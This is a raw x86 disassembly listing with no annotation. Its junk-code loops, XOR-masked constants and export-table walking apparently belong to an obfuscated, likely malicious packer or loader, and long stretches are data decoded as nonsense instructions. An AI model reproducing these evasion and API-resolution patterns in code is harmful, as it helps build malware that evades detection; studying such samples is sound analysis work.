  40cd6e:	mov    DWORD PTR ds:0x4302b9,0x6115
  40cd78:	jmp    0x40cd93
  40cd7d:	sbb    eax,0x6db0
  40cd82:	mov    eax,DWORD PTR [ebp+0xc]
  40cd85:	adc    DWORD PTR ds:0x4302bd,0x4302c9
  40cd8f:	xor    eax,ecx
  40cd91:	add    eax,edx
  40cd93:	mov    ds:0x412224,eax
  40cd98:	mov    eax,DWORD PTR [ebp+0xc]
  40cd9b:	xor    eax,ecx
  40cd9d:	add    eax,edx
  40cd9f:	mov    ds:0x41222c,eax
  40cda4:	jmp    0x40cdb3
  40cda9:	mov    eax,ds:0x41222c
  40cdae:	mov    ds:0x412224,eax
  40cdb3:	mov    eax,DWORD PTR [ebp+0x8]
  40cdb6:	mov    eax,DWORD PTR [eax]
  40cdb8:	mov    ecx,DWORD PTR ds:0x412224
  40cdbe:	add    DWORD PTR [eax],ecx
  40cdc0:	pop    esi
  40cdc1:	pop    ebp
  40cdc2:	ret    0x8
  40cdc5:	push   ebp
  40cdc6:	mov    ebp,esp
  40cdc8:	sub    esp,0x30
  40cdcb:	sbb    eax,DWORD PTR ds:0x42ec4b
  40cdd1:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40cdd8:	and    DWORD PTR ds:0x4302c9,0x0
  40cde2:	mov    eax,ds:0x4302c9
  40cde7:	inc    eax
  40cde8:	mov    ds:0x4302c9,eax
  40cded:	cmp    DWORD PTR ds:0x4302c9,0x18
  40cdf4:	jne    0x40ce06
  40cdfa:	push   DWORD PTR [ebp-0x10]
  40cdfd:	push   DWORD PTR [ebp-0x1c]
  40ce00:	call   DWORD PTR ds:0x42e94f
  40ce06:	cmp    DWORD PTR ds:0x4302c9,0x13
  40ce0d:	jb     0x40cde2
  40ce13:	adc    DWORD PTR ds:0x42ec57,0x4965
  40ce1d:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  40ce24:	mov    ecx,DWORD PTR [ebp-0x4]
  40ce27:	sub    DWORD PTR ds:0x43034f,0x97c
  40ce31:	push   ebx
  40ce32:	adc    ebx,eax
  40ce34:	mov    eax,0x7510854
  40ce39:	xor    ecx,eax
  40ce3b:	add    ebx,0x6e38
  40ce41:	mov    ebx,0x32729b
  40ce46:	add    ecx,ebx
  40ce48:	mov    DWORD PTR [ebp-0x1c],ecx
  40ce4b:	and    ecx,0x1130
  40ce51:	mov    ecx,DWORD PTR [ebp+0x14]
  40ce54:	sub    DWORD PTR ds:0x42ec63,0x43035f
  40ce5e:	push   esi
  40ce5f:	push   edi
  40ce60:	test   ecx,ecx
  40ce62:	mov    DWORD PTR ds:0x42e64c,0x9d3
  40ce6c:	je     0x40cf83
  40ce72:	mov    DWORD PTR ds:0x4302bd,0x17
  40ce7c:	cmp    DWORD PTR ds:0x4302bd,0x0
  40ce83:	je     0x40cf64
  40ce89:	cmp    DWORD PTR ds:0x4302bd,0x5
  40ce90:	jne    0x40ced0
  40ce96:	push   0x56ae
  40ce9b:	push   DWORD PTR [ebp-0x28]
  40ce9e:	push   0x17dc
  40cea3:	push   0x51d4
  40cea8:	push   DWORD PTR [ebp-0x28]
  40ceab:	push   0x8ee9
  40ceb0:	push   DWORD PTR [ebp-0x1c]
  40ceb3:	push   0x10f5
  40ceb8:	push   DWORD PTR [ebp-0x18]
  40cebb:	push   0x42e65c
  40cec0:	push   0x42e763
  40cec5:	push   0x4a36
  40ceca:	call   DWORD PTR ds:0x42eac3
  40ced0:	cmp    DWORD PTR ds:0x4302bd,0x6
  40ced7:	jne    0x40ceea
  40cedd:	mov    edi,DWORD PTR ds:0x4302bd
  40cee3:	dec    edi
  40cee4:	mov    DWORD PTR ds:0x4302bd,edi
  40ceea:	mov    edi,DWORD PTR ds:0x4302bd
  40cef0:	dec    edi
  40cef1:	mov    DWORD PTR ds:0x4302bd,edi
  40cef7:	jmp    0x40ce7c
  40cefc:	mov    DWORD PTR ds:0x42e654,0x14
  40cf06:	cmp    DWORD PTR ds:0x42e654,0x0
  40cf0d:	je     0x40cf64
  40cf13:	cmp    DWORD PTR ds:0x42e654,0x5
  40cf1a:	jne    0x40cf36
  40cf20:	push   DWORD PTR [ebp-0x28]
  40cf23:	push   0x4302cd
  40cf28:	push   DWORD PTR [ebp-0x24]
  40cf2b:	push   0x3dba
  40cf30:	call   DWORD PTR ds:0x42eac7
  40cf36:	cmp    DWORD PTR ds:0x42e654,0x6
  40cf3d:	jne    0x40cf50
  40cf43:	mov    esi,DWORD PTR ds:0x42e654
  40cf49:	dec    esi
  40cf4a:	mov    DWORD PTR ds:0x42e654,esi
  40cf50:	mov    esi,DWORD PTR ds:0x42e654
  40cf56:	dec    esi
  40cf57:	mov    DWORD PTR ds:0x42e654,esi
  40cf5d:	jmp    0x40cf06
  40cf62:	add    edi,ecx
  40cf64:	mov    ecx,DWORD PTR [ebp+0x14]
  40cf67:	xor    DWORD PTR ds:0x42ec6f,0x2c6d
  40cf71:	mov    ecx,DWORD PTR [ecx]
  40cf73:	movzx  edi,BYTE PTR ds:0x42e644
  40cf7a:	sbb    DWORD PTR ds:0x4302b5,edi
  40cf80:	mov    DWORD PTR [ebp-0x1c],ecx
  40cf83:	imul   edx,eax
  40cf86:	mov    ecx,0x4573
  40cf8b:	mov    DWORD PTR ds:0x43035b,0x1f
  40cf95:	cmp    DWORD PTR ds:0x43035b,0x0
  40cf9c:	je     0x40cfed
  40cfa2:	cmp    DWORD PTR ds:0x43035b,0x9
  40cfa9:	jne    0x40cfbd
  40cfaf:	push   0x42ec5b
  40cfb4:	push   DWORD PTR [ebp-0x1c]
  40cfb7:	call   DWORD PTR ds:0x42e88f
  40cfbd:	cmp    DWORD PTR ds:0x43035b,0xa
  40cfc4:	jne    0x40cfd7
  40cfca:	mov    esi,DWORD PTR ds:0x43035b
  40cfd0:	dec    esi
  40cfd1:	mov    DWORD PTR ds:0x43035b,esi
  40cfd7:	xor    esi,esi
  40cfd9:	or     esi,DWORD PTR ds:0x43035b
  40cfdf:	dec    esi
  40cfe0:	mov    DWORD PTR ds:0x43035b,esi
  40cfe6:	jmp    0x40cf95
  40cfeb:	add    esi,edi
  40cfed:	add    edx,ecx
  40cfef:	mov    DWORD PTR ds:0x42ec73,0x11
  40cff9:	cmp    DWORD PTR ds:0x42ec73,0x0
  40d000:	je     0x40d094
  40d006:	cmp    DWORD PTR ds:0x42ec73,0x3
  40d00d:	jne    0x40d024
  40d013:	push   DWORD PTR [ebp-0x18]
  40d016:	push   0x42e658
  40d01b:	push   DWORD PTR [ebp-0x18]
  40d01e:	call   DWORD PTR ds:0x42eacb
  40d024:	cmp    DWORD PTR ds:0x42ec73,0x4
  40d02b:	jne    0x40d03e
  40d031:	mov    esi,DWORD PTR ds:0x42ec73
  40d037:	dec    esi
  40d038:	mov    DWORD PTR ds:0x42ec73,esi
  40d03e:	mov    esi,DWORD PTR ds:0x42ec73
  40d044:	dec    esi
  40d045:	mov    DWORD PTR ds:0x42ec73,esi
  40d04b:	jmp    0x40cff9
  40d050:	and    DWORD PTR ds:0x4302b9,0x0
  40d05a:	mov    esi,DWORD PTR ds:0x4302b9
  40d060:	inc    esi
  40d061:	mov    DWORD PTR ds:0x4302b9,esi
  40d067:	cmp    DWORD PTR ds:0x4302b9,0x23
  40d06e:	jne    0x40d087
  40d074:	push   0x4365
  40d079:	push   0x641d
  40d07e:	push   DWORD PTR [ebp-0xc]
  40d081:	call   DWORD PTR ds:0x42e893
  40d087:	cmp    DWORD PTR ds:0x4302b9,0x19
  40d08e:	jb     0x40d05a
  40d094:	mov    esi,0x7879
  40d099:	mov    edi,DWORD PTR ds:0x42ec5b
  40d09f:	sub    DWORD PTR ds:0x42e63c,edi
  40d0a5:	mov    edi,0x1556
  40d0aa:	xchg   esi,ecx
  40d0ac:	mov    ecx,DWORD PTR ds:0x42ec5f
  40d0b2:	xor    DWORD PTR ds:0x42ec67,ecx
  40d0b8:	sub    edx,edi
  40d0ba:	xor    esi,esi
  40d0bc:	movzx  ecx,WORD PTR ds:0x42e654
  40d0c3:	or     DWORD PTR ds:0x4302c1,ecx
  40d0c9:	mov    DWORD PTR [ebp-0x28],esi
  40d0cc:	or     ecx,DWORD PTR ds:0x42ec73
  40d0d2:	mov    DWORD PTR [ebp-0x2c],esi
  40d0d5:	sbb    DWORD PTR ds:0x4302cd,ebx
  40d0db:	mov    DWORD PTR [ebp-0x14],esi
  40d0de:	or     DWORD PTR ds:0x42ec5b,ebx
  40d0e4:	mov    DWORD PTR [ebp-0x8],esi
  40d0e7:	mov    ecx,DWORD PTR ds:0x43036b
  40d0ed:	xor    DWORD PTR ds:0x42ec5f,ecx
  40d0f3:	mov    ecx,DWORD PTR [ebp-0x18]
  40d0f6:	xor    ecx,eax
  40d0f8:	xor    DWORD PTR ds:0x42ec57,0x70e3
  40d102:	xor    edi,edi
  40d104:	movzx  eax,BYTE PTR ds:0x42ec4f
  40d10b:	or     DWORD PTR ds:0x42ec5b,eax
  40d111:	jmp    0x40d25a
  40d116:	adc    al,0xe1
  40d118:	addr16 jp 0x40d18e
  40d11b:	clc    
  40d11c:	jno    0x40d10f
  40d11e:	inc    ebx
  40d11f:	xor    bl,al
  40d121:	xor    edi,ecx
  40d123:	(bad)  
  40d127:	cmp    DWORD PTR [esi+0x7e],0x7e7e7f22
  40d12e:	jecxz  0x40d19c
  40d130:	push   ebx
  40d131:	call   0xeab6:0x1913eee8
  40d138:	stos   BYTE PTR es:[edi],al
  40d139:	jl     0x40d0d3
  40d13b:	es clc 
  40d13d:	add    BYTE PTR [ebp-0x43],al
  40d140:	loopne 0x40d148
  40d142:	mov    al,0x78
  40d144:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d145:	ss int3 
  40d147:	push   0x70991f8f
  40d14c:	xor    edx,DWORD PTR [ebx]
  40d14e:	call   0x6d0839c1
  40d153:	pop    ds
  40d154:	cmp    al,0xcf
  40d157:	push   ecx
  40d158:	(bad)  
  40d15a:	mov    BYTE PTR [edx+edi*2],ah
  40d15d:	push   es
  40d15e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d15f:	adc    BYTE PTR cs:[esi+ecx*8],bl
  40d163:	mov    ds:0x9ae70b42,eax
  40d168:	mov    WORD PTR [ecx-0x1e],?
  40d16b:	pop    ebp
  40d16c:	pop    esp
  40d16d:	(bad)  
  40d16e:	pop    esi
  40d16f:	pushf  
  40d170:	imul   ecx,DWORD PTR [ebx-0x28],0x76
  40d174:	lock or dh,BYTE PTR [eax-0x6f]
  40d178:	test   BYTE PTR [edx+0x6cdedc50],0x19
  40d17f:	or     eax,0xd20ee8e0
  40d184:	std    
  40d185:	cmp    eax,0x323f1c04
  40d18a:	xor    DWORD PTR [ebx+0x76be5c61],edi
  40d190:	aas    
  40d191:	lock inc esi
  40d193:	mov    ah,0xe9
  40d195:	adc    eax,0x77c49539
  40d19a:	cwde   
  40d19b:	imul   edx,DWORD PTR [ebx],0xfff48809
  40d1a1:	scas   eax,DWORD PTR es:[edi]
  40d1a2:	lock fidiv DWORD PTR [edx+0x7b8e65f6]
  40d1a9:	mov    ecx,0x8720d75e
  40d1ae:	xchg   ecx,eax
  40d1af:	sub    ecx,DWORD PTR [eax-0x70]
  40d1b2:	mov    ds:0x6bf952d4,eax
  40d1b7:	cmp    DWORD PTR [ecx-0x6f052b68],0xffffff8a
  40d1be:	push   ss
  40d1bf:	jo     0x40d21a
  40d1c1:	cli    
  40d1c2:	cmp    al,0x15
  40d1c4:	cmp    al,0xb2
  40d1c6:	(bad)  
  40d1c7:	lock into 
  40d1c9:	or     ecx,DWORD PTR [ecx-0xf20826]
  40d1cf:	jno    0x40d21d
  40d1d1:	inc    ecx
  40d1d2:	(bad)  [edx-0x2f9e8e0]
  40d1d8:	and    BYTE PTR [esi+ebx*1],bl
  40d1db:	push   0x279ba5d9
  40d1e0:	xor    eax,0xa83df10d
  40d1e5:	inc    ebx
  40d1e6:	and    esi,DWORD PTR [ebp+0x37]
  40d1e9:	test   DWORD PTR [ecx-0x72ec1318],eax
  40d1ef:	cmp    dl,bl
  40d1f1:	sar    DWORD PTR [esi],1
  40d1f3:	repnz lods al,BYTE PTR ds:[esi]
  40d1f5:	js     0x40d1c9
  40d1f7:	dec    edi
  40d1f8:	or     al,0x35
  40d1fa:	or     al,0xea
  40d1fc:	(bad)  
  40d1fd:	aam    0xb0
  40d1ff:	out    0x37,al
  40d201:	adc    BYTE PTR ds:[ebx+0x71],0x91
  40d206:	mov    dl,0x9f
  40d208:	pop    edi
  40d209:	mov    esp,0x26ef6dd1
  40d20e:	nop
  40d20f:	mov    eax,esp
  40d211:	push   esp
  40d212:	icebp  
  40d213:	(bad)  
  40d214:	mov    ch,0x34
  40d216:	cmp    al,0x82
  40d218:	jp     0x40d234
  40d21a:	mov    edx,0xded65d8a
  40d21f:	sbb    BYTE PTR [ebp+0x455a8b3b],cl
  40d225:	sti    
  40d226:	xchg   edx,eax
  40d227:	or     al,0x5d
  40d229:	in     eax,0xa2
  40d22b:	mov    esp,0x1beb12d0
  40d230:	enter  0xf9f4,0x1a
  40d234:	jo     0x40d2b2
  40d236:	adc    ch,BYTE PTR [ebp-0x57]
  40d239:	out    0xef,eax
  40d23b:	outs   dx,BYTE PTR ds:[esi]
  40d23c:	xor    ebp,DWORD PTR [ebx]
  40d23e:	int    0x1b
  40d240:	imul   edi,DWORD PTR [esi+0x54],0x31
  40d244:	pop    ss
  40d245:	sub    ch,BYTE PTR [esi]
  40d247:	popa   
  40d248:	(bad)  
  40d249:	cmp    ebx,esi
  40d24b:	sub    DWORD PTR [ebp-0x52],ebx
  40d24e:	inc    esp
  40d24f:	or     BYTE PTR [ebx],bh
  40d251:	cmp    DWORD PTR [ebx-0x7c342323],esi
  40d257:	sbb    edi,DWORD PTR [esi+0x59]
  40d25a:	add    ecx,ebx
  40d25c:	mov    DWORD PTR [ebp-0x20],ecx
  40d25f:	mov    eax,ds:0x430367
  40d264:	mov    eax,DWORD PTR [ebp-0x20]
  40d267:	je     0x40d591
  40d26d:	mov    eax,DWORD PTR [ebp-0x4]
  40d270:	and    DWORD PTR ds:0x42ec67,0x42e644
  40d27a:	xor    eax,0x7510854
  40d27f:	or     DWORD PTR ds:0x42ec6f,0x3ff6
  40d289:	add    eax,ebx
  40d28b:	mov    DWORD PTR ds:0x42ec5f,0x774f
  40d295:	cmp    edi,eax
  40d297:	mov    DWORD PTR ds:0x42ec57,0x9b6
  40d2a1:	jne    0x40d3eb
  40d2a7:	push   DWORD PTR [ebp+0x8]
  40d2aa:	sub    DWORD PTR ds:0x4302b9,0x4302c5
  40d2b4:	call   0x40cbbb
  40d2b9:	mov    ecx,DWORD PTR ds:0x43035f
  40d2bf:	add    DWORD PTR ds:0x42ec57,ecx
  40d2c5:	mov    DWORD PTR [ebp-0x20],eax
  40d2c8:	add    ecx,ecx
  40d2ca:	mov    eax,DWORD PTR [ebp-0x4]
  40d2cd:	mov    ecx,DWORD PTR [ebp-0x20]
  40d2d0:	mov    esi,DWORD PTR ds:0x42e7ef
  40d2d6:	mov    esi,DWORD PTR [esi]
  40d2d8:	and    DWORD PTR ds:0x4302e5,esi
  40d2de:	mov    esi,0x7510854
  40d2e3:	sub    DWORD PTR ds:0x4302dd,0x42ec53
  40d2ed:	xor    eax,esi
  40d2ef:	add    eax,ebx
  40d2f1:	mov    DWORD PTR ds:0x42e644,0x6de1
  40d2fb:	cmp    ecx,eax
  40d2fd:	mov    DWORD PTR ds:0x4302c9,0x4fd
  40d307:	je     0x40d575
  40d30d:	sbb    DWORD PTR ds:0x4302e5,0x4302bd
  40d317:	push   DWORD PTR [ebp-0x20]
  40d31a:	push   DWORD PTR [ebp+0x8]
  40d31d:	mov    DWORD PTR ds:0x42e644,0x2d65
  40d327:	call   0x4041b8
  40d32c:	xor    DWORD PTR ds:0x42ec6b,0x6710
  40d336:	mov    DWORD PTR [ebp-0x14],eax
  40d339:	or     DWORD PTR ds:0x4302c9,0x430353
  40d343:	mov    eax,DWORD PTR [ebp-0x4]
  40d346:	adc    DWORD PTR ds:0x4302b5,0x2fc0
  40d350:	mov    ecx,DWORD PTR [ebp-0x14]
  40d353:	add    DWORD PTR ds:0x4302cd,0x5a83
  40d35d:	xor    eax,esi
  40d35f:	add    eax,ebx
  40d361:	mov    DWORD PTR ds:0x4302e1,0x3b14
  40d36b:	cmp    ecx,eax
  40d36d:	je     0x40d575
  40d373:	mov    eax,DWORD PTR [ebp-0x14]
  40d376:	and    DWORD PTR ds:0x4302dd,0x0
  40d380:	mov    ecx,DWORD PTR ds:0x4302dd
  40d386:	inc    ecx
  40d387:	mov    DWORD PTR ds:0x4302dd,ecx
  40d38d:	cmp    DWORD PTR ds:0x4302dd,0x1d
  40d394:	jne    0x40d3b2
  40d39a:	push   0x4302c1
  40d39f:	push   0x883a
  40d3a4:	push   0x157c
  40d3a9:	push   DWORD PTR [ebp-0x28]
  40d3ac:	call   DWORD PTR ds:0x42e953
  40d3b2:	cmp    DWORD PTR ds:0x4302dd,0x18
  40d3b9:	jb     0x40d380
  40d3bf:	mov    eax,DWORD PTR [eax+0x18]
  40d3c2:	mov    DWORD PTR [ebp-0x20],eax
  40d3c5:	mov    eax,DWORD PTR [ebp-0x14]
  40d3c8:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3cb:	add    ecx,DWORD PTR [eax+0x20]
  40d3ce:	mov    DWORD PTR [ebp-0x28],ecx
  40d3d1:	mov    eax,DWORD PTR [ebp-0x14]
  40d3d4:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3d7:	add    ecx,DWORD PTR [eax+0x24]
  40d3da:	mov    DWORD PTR [ebp-0x2c],ecx
  40d3dd:	mov    eax,DWORD PTR [ebp-0x14]
  40d3e0:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3e3:	add    ecx,DWORD PTR [eax+0x1c]
  40d3e6:	xor    esi,esi
  40d3e8:	mov    DWORD PTR [ebp-0x14],ecx
  40d3eb:	mov    eax,DWORD PTR [ebp-0x28]
  40d3ee:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3f1:	add    ecx,DWORD PTR [eax+edi*4]
  40d3f4:	lea    eax,[ebp-0x8]
  40d3f7:	mov    DWORD PTR [ebp-0x30],ecx
  40d3fa:	push   eax
  40d3fb:	push   DWORD PTR [ebp-0x30]
  40d3fe:	jmp    0x40d547
  40d403:	add    al,BYTE PTR [ebx]
  40d405:	in     eax,dx
  40d406:	jecxz  0x40d3f5
  40d408:	icebp  
  40d409:	adc    bl,ah
  40d40b:	push   0xae6a8e30
  40d410:	mov    eax,0x8ead4234
  40d415:	jle    0x40d495
  40d417:	and    bh,BYTE PTR [edi+0x7e]
  40d41a:	jle    0x40d414
  40d41c:	fdivr  st,st(4)
  40d41e:	inc    esi
  40d41f:	repnz push eax
  40d421:	test   BYTE PTR [ecx+esi*4+0x3e],bh
  40d425:	ja     0x40d468
  40d427:	jmp    0xffe1:0xb21e83f
  40d42e:	call   0xcec48468
  40d433:	int    0xbe
  40d435:	int3   
  40d436:	out    0x1e,al
  40d438:	sub    al,bh
  40d43a:	lods   eax,DWORD PTR ds:[esi]
  40d43b:	jnp    0x40d437
  40d43d:	je     0x40d426
  40d43f:	sub    eax,0xb8c9689c
  40d444:	and    al,0x40
  40d446:	test   al,0x60
  40d448:	mov    al,0xf7
  40d44a:	mov    al,0xa
  40d44c:	out    dx,eax
  40d44d:	addr16 inc ecx
  40d44f:	mov    edi,0x4d3bed77
  40d454:	push   ebx
  40d455:	pop    esp
  40d456:	loop   0x40d3fd
  40d458:	and    BYTE PTR [edx],ch
  40d45a:	cmp    al,0x53
  40d45c:	sti    
  40d45d:	inc    edi
  40d45e:	mov    esi,0xb34a891a
  40d463:	call   FWORD PTR [esi]
  40d465:	adc    ecx,ebp
  40d467:	adc    DWORD PTR [eax+0x3d],0xffffffec
  40d46b:	ror    DWORD PTR [edx],1
  40d46d:	push   0x655cd56c
  40d472:	shr    DWORD PTR [ebp+0x3f3e129f],cl
  40d478:	dec    eax
  40d479:	imul   esp,ebx,0x1225d7ef
  40d47f:	push   eax
  40d480:	cmp    eax,0x1aa30481
  40d485:	mov    al,0x14
  40d487:	mov    ecx,0xdab61fcf
  40d48c:	xor    DWORD PTR [eax+0x1553182c],edi
  40d492:	shr    BYTE PTR [eax+0x55],1
  40d495:	xchg   ebp,eax
  40d496:	push   edi
  40d497:	dec    ebx
  40d498:	cmc    
  40d499:	adc    DWORD PTR [esi+0x47080297],esp
  40d49f:	mov    dl,0xd9
  40d4a1:	aam    0xf2
  40d4a3:	push   eax
  40d4a4:	es pop ebx
  40d4a6:	jb     0x40d42f
  40d4a8:	retf   
  40d4a9:	out    dx,eax
  40d4aa:	or     BYTE PTR [ebx+0x23],ah
  40d4ad:	out    0x23,al
  40d4af:	std    
  40d4b0:	sbb    cl,BYTE PTR [esi+0x3c765748]
  40d4b6:	pop    edx
  40d4b7:	inc    ebx
  40d4b8:	scas   eax,DWORD PTR es:[edi]
  40d4b9:	out    dx,al
  40d4ba:	repnz fisttp DWORD PTR [ecx-0x20]
  40d4be:	jbe    0x40d443
  40d4c0:	std    
  40d4c1:	in     al,dx
  40d4c2:	aaa    
  40d4c3:	test   DWORD PTR [edi+edi*1+0x7855d8bb],ebx
  40d4ca:	cmp    al,0x33
  40d4cc:	mov    ebx,ebp
  40d4ce:	mov    ds:0xabdaa7ac,al
  40d4d3:	popa   
  40d4d4:	adc    BYTE PTR [eax],0x34
  40d4d7:	cwde   
  40d4d8:	adc    al,0x61
  40d4da:	(bad)  
  40d4db:	dec    esi
  40d4dc:	push   ebp
  40d4dd:	popf   
  40d4de:	out    dx,al
  40d4df:	push   ss
  40d4e0:	pop    eax
  40d4e1:	in     al,dx
  40d4e2:	xchg   esi,eax
  40d4e3:	push   eax
  40d4e4:	dec    ecx
  40d4e5:	jge    0x40d534
  40d4e7:	xor    esi,DWORD PTR [ebx]
  40d4e9:	dec    ebp
  40d4ea:	aaa    
  40d4eb:	or     ecx,DWORD PTR [esi+0x26edd797]
  40d4f1:	sub    eax,0xa0d98300
  40d4f6:	sub    al,0x8a
  40d4f8:	in     eax,0x11
  40d4fa:	dec    edx
  40d4fb:	and    bl,cl
  40d4fd:	add    bl,bl
  40d4ff:	adc    DWORD PTR [eax+ebp*4-0x55c38e2a],ebp
  40d506:	imul   edi,DWORD PTR [edx+0x39],0x27
  40d50a:	jb     0x40d4b8
  40d50c:	jmp    0x40d4ec
  40d50e:	int    0xb1
  40d510:	fstp   TBYTE PTR [edi-0x6b]
  40d513:	dec    ecx
  40d514:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40d516:	push   es
  40d517:	xor    bh,BYTE PTR [esp+ebp*1-0x5ceb1690]
  40d51e:	pop    ebp
  40d51f:	clc    
  40d520:	loopne 0x40d4c7
  40d522:	or     eax,0xa625a690
  40d527:	fdivr  DWORD PTR [edi]
  40d529:	dec    edi
  40d52a:	outs   dx,BYTE PTR ds:[esi]
  40d52b:	push   eax
  40d52c:	loope  0x40d56e
  40d52e:	aas    
  40d52f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d530:	std    
  40d531:	ja     0x40d4ca
  40d533:	sahf   
  40d534:	out    0x1b,eax
  40d536:	cmp    cl,bl
  40d538:	pop    ecx
  40d539:	iret   
  40d53a:	fs pop esi
  40d53c:	scas   eax,DWORD PTR es:[edi]
  40d53d:	jbe    0x40d5a5
  40d53f:	cwde   
  40d540:	xlat   BYTE PTR ds:[bx]
  40d542:	addr16 jae 0x40d4e7
  40d545:	leave  
  40d546:	fdiv   st(7),st
  40d548:	jne    0x40d556
  40d54a:	call   0x402e68
  40d54f:	mov    eax,DWORD PTR [ebp-0x4]
  40d552:	mov    ecx,DWORD PTR [ebp-0x8]
  40d555:	xor    eax,0x7510854
  40d55a:	add    eax,ebx
  40d55c:	cmp    ecx,eax
  40d55e:	jne    0x40d581
  40d564:	mov    eax,DWORD PTR [ebp-0x20]
  40d567:	inc    edi
  40d568:	cmp    edi,eax
  40d56a:	jb     0x40d26d
  40d570:	jmp    0x40d591
  40d575:	mov    eax,DWORD PTR [ebp-0x4]
  40d578:	xor    eax,esi
  40d57a:	add    eax,ebx
  40d57c:	jmp    0x40dfde
  40d581:	mov    eax,DWORD PTR [ebp-0x2c]
  40d584:	movzx  eax,WORD PTR [eax+edi*2]
  40d588:	mov    ecx,DWORD PTR [ebp-0x14]
  40d58b:	mov    eax,DWORD PTR [ecx+eax*4]
  40d58e:	mov    DWORD PTR [ebp+0xc],eax
  40d591:	mov    eax,DWORD PTR [ebp-0x4]
  40d594:	mov    ecx,DWORD PTR [ebp-0x8]
  40d597:	xor    eax,0x7510854
  40d59c:	add    eax,ebx
  40d59e:	cmp    ecx,eax
  40d5a0:	jne    0x40d6fc
  40d5a6:	jmp    0x40d6ef
  40d5ab:	aad    0x5b
  40d5ad:	fstp   DWORD PTR [ecx+0x73559971]
  40d5b3:	push   0x64
  40d5b5:	fsin   
  40d5b7:	push   ebx
  40d5b8:	cs or  esi,edi
  40d5bb:	push   ecx
  40d5bc:	(bad)  
  40d5bd:	jle    0x40d63d
  40d5bf:	and    bh,BYTE PTR [edi+0x7e]
  40d5c2:	jle    0x40d641
  40d5c4:	jg     0x40d546
  40d5c6:	push   esp
  40d5c7:	imul   ecx,DWORD PTR [ebx-0x2f7481c0],0x9b286e34
  40d5d1:	cdq    
  40d5d2:	cmp    DWORD PTR [ebx+0x40],esp
  40d5d5:	pop    eax
  40d5d6:	sti    
  40d5d7:	clc    
  40d5d8:	(bad)
  40d5dc:	lock out 0xda,al
  40d5df:	dec    ecx
  40d5e0:	adc    dh,BYTE PTR [ebx+0x6b82c01e]
  40d5e6:	dec    eax
  40d5e7:	mov    eax,0xbdb5f013
  40d5ec:	and    BYTE PTR [ebx-0x66107979],0x6d
  40d5f3:	fbstp  TBYTE PTR cs:[ecx-0x6185e288]
  40d5fa:	pop    edi
  40d5fb:	jno    0x40d5b7
  40d5fd:	mov    eax,ds:0x3c98c79f
  40d602:	dec    ecx
  40d603:	fwait
  40d604:	cli    
  40d605:	jge    0x40d5a6
  40d607:	mov    bh,0x7a
  40d609:	pushf  
  40d60a:	push   esi
  40d60b:	or     DWORD PTR [ebx+0x67caa917],esp
  40d611:	(bad)  
  40d612:	scas   eax,DWORD PTR es:[edi]
  40d613:	lock xor BYTE PTR [ebp+0x2b98a4b6],ch
  40d61a:	add    DWORD PTR [edi-0x56b2239d],ebp
  40d620:	rcl    DWORD PTR [ebx-0x4dfd69b8],1
  40d626:	cdq    
  40d627:	out    dx,eax
  40d628:	das    
  40d629:	xlat   BYTE PTR ds:[ebx]
  40d62a:	jbe    0x40d695
  40d62c:	aaa    
  40d62d:	stos   BYTE PTR es:[edi],al
  40d62e:	mov    BYTE PTR ss:[edi],dl
  40d631:	mov    esi,0xac24ea0f
  40d636:	inc    ebp
  40d637:	test   al,0x89
  40d639:	dec    ecx
  40d63a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d63b:	and    eax,0x5ea34863
  40d640:	push   esi
  40d641:	shufps xmm4,XMMWORD PTR [ebx+0x55],0x48
  40d646:	inc    esi
  40d647:	inc    esp
  40d648:	jnp    0x40d616
  40d64a:	jae    0x40d699
  40d64c:	imul   ecx,DWORD PTR [ebx-0x19481145],0xffffffa4
  40d653:	cmp    esi,eax
  40d655:	inc    ecx
  40d656:	or     al,0xf3
  40d658:	stos   DWORD PTR es:[edi],eax
  40d659:	ds push esi
  40d65b:	ins    DWORD PTR es:[edi],dx
  40d65c:	lock sbb ebp,DWORD PTR [esi-0x1eda1ed7]
  40d663:	sbb    esp,eax
  40d665:	sbb    bl,BYTE PTR [ebx-0x3]
  40d668:	adc    ecx,eax
  40d66a:	repz sbb BYTE PTR [eax-0x33],bh
  40d66e:	dec    ecx
  40d66f:	shr    edi,1
  40d671:	in     eax,0xe2
  40d673:	ins    DWORD PTR es:[edi],dx
  40d674:	mov    ecx,0x23fe3695
  40d679:	push   esi
  40d67a:	ret    
  40d67b:	stc    
  40d67c:	xchg   ebx,eax
  40d67d:	(bad)  
  40d67e:	(bad)  
  40d67f:	and    esi,DWORD PTR ds:0x117aa33c
  40d685:	mov    gs,WORD PTR [ebx+0x47d00710]
  40d68b:	ds mov edx,0xbf494ad3
  40d691:	ret    
  40d692:	pop    edx
  40d693:	(bad)  
  40d694:	sub    eax,0x2d20f140
  40d699:	pop    ebp
  40d69a:	cwde   
  40d69b:	mov    cl,0x29
  40d69d:	bound  ecx,QWORD PTR [esi]
  40d69f:	sbb    eax,0x38c14f90
  40d6a4:	mov    dh,0x91
  40d6a6:	pop    ebx
  40d6a7:	(bad)  
  40d6a8:	jg     0x40d6f0
  40d6aa:	dec    ebp
  40d6ab:	lahf   
  40d6ac:	leave  
  40d6ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6ae:	cmp    DWORD PTR [ecx-0x4f],ecx
  40d6b1:	push   ecx
  40d6b2:	loopne 0x40d6bf
  40d6b4:	xchg   dh,al
  40d6b6:	cmp    BYTE PTR [ecx+0x5c],al
  40d6b9:	fld    DWORD PTR [edi]
  40d6bb:	out    dx,eax
  40d6bc:	aaa    
  40d6bd:	fldcw  WORD PTR [ebx+0x5c79729f]
  40d6c3:	shr    BYTE PTR ds:[edx-0x5c05c575],1
  40d6ca:	pop    ebx
  40d6cb:	cwde   
  40d6cc:	jl     0x40d668
  40d6ce:	xor    BYTE PTR [esi],ch
  40d6d0:	dec    edx
  40d6d1:	lods   al,BYTE PTR ds:[esi]
  40d6d2:	push   ds
  40d6d3:	xchg   ebp,eax
  40d6d4:	add    BYTE PTR [ebp-0x36],dh
  40d6d7:	or     ah,dh
